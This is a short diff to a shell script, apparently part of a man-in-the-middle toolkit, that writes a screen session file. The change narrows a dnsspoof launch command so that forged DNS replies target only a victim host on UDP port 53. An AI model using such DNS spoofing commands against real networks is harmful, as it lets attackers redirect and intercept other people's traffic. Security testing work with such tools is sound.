@@ -105,7 +105,7 @@ fi
 
 if [ ! -z "$DNSSPOOF" ]
 then
-	echo -e "screen -t dnsspoof dnsspoof -i $INTERFACE -f $DNSSPOOF" >> $RCFILE
+	echo -e "screen -t dnsspoof dnsspoof -i $INTERFACE -f $DNSSPOOF host $VICTIM and udp port 53" >> $RCFILE
 fi
 
 echo -e "screen -r -t Main" >> $RCFILE
